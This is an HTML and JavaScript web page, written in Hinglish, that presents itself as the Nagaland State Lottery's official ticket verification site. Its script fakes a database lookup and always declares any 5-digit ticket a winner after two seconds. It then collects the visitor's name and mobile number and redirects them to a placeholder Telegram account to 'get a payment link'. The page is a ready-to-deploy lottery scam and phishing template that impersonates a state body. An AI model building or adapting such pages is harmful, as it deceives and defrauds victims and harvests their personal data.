<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dear Lottery - Official Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --green: #1b5e20; --orange: #ff9800; --red: #d32f2f; }
        body { margin: 0; background: #f4f7f6; font-family: 'Poppins', sans-serif; }
        
        .header { background: var(--green); color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; }
        
        .main-container { padding: 20px; }
        
        /* Ticket Check Box */
        .card { background: white; border-radius: 15px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; border-top: 5px solid var(--orange); }
        h3 { margin-top: 0; color: #333; font-size: 18px; }
        
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        
        .btn-check { width: 100%; background: var(--green); color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
        
        /* Result Status (Hidden by default) */
        #status-box { display: none; margin-top: 20px; text-align: center; }
        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--green); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .footer-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #eee; }
        .nav-item { color: #888; text-decoration: none; font-size: 12px; text-align: center; }
        .nav-item.active { color: var(--green); }
    </style>
</head>
<body>

<div class="header">NAGALAND STATE LOTTERY</div>

<div class="main-container">
    <div class="card" id="step-1">
        <h3><i class="fa-solid fa-magnifying-glass"></i> Ticket Verification</h3>
        <p style="font-size: 12px; color: #666;">Apna 5-digit ticket number check karein.</p>
        <input type="text" id="ticketNum" placeholder="Ex: 84521" maxlength="5">
        <button class="btn-check" onclick="checkTicket()">Verify Ticket</button>
        
        <div id="status-box">
            <div class="loading-spinner"></div>
            <p>Checking server database...</p>
        </div>
    </div>

    <div class="card" id="step-2" style="display:none;">
        <h3 style="color: var(--green);"><i class="fa-solid fa-circle-check"></i> Ticket Found!</h3>
        <p style="font-size: 13px;">Kripya apni sahi detail bharein:</p>
        <input type="text" id="custName" placeholder="Pura Naam">
        <input type="number" id="custPhone" placeholder="Mobile Number">
        <button class="btn-check" style="background: var(--orange);" onclick="submitDetails()">Submit & Get Payment Link</button>
    </div>
</div>

<div class="footer-nav">
    <a href="#" class="nav-item active"><i class="fa-solid fa-ticket"></i><br>Check</a>
    <a href="admin.html" class="nav-item"><i class="fa-solid fa-user-lock"></i><br>Admin</a>
</div>

<script>
    function checkTicket() {
        let t = document.getElementById('ticketNum').value;
        if(t.length < 5) { alert("Sahi 5-digit number daalein"); return; }
        
        document.getElementById('status-box').style.display = 'block';
        
        // Simulating check - Asli system mein ye Admin approve karega
        setTimeout(() => {
            document.getElementById('step-1').style.display = 'none';
            document.getElementById('step-2').style.display = 'block';
        }, 2000);
    }

    function submitDetails() {
        let name = document.getElementById('custName').value;
        let phone = document.getElementById('custPhone').value;
        if(!name || !phone) { alert("Sabhi details bharein"); return; }
        
        // Redirecting to Telegram for Payment
        let msg = `New_Claim_Request:%0AName: ${name}%0APhone: ${phone}%0ATicket: ${document.getElementById('ticketNum').value}`;
        window.location.href = `https://t.me/YOUR_TELEGRAM_USERNAME?text=${msg}`;
    }
</script>

</body>
</html>
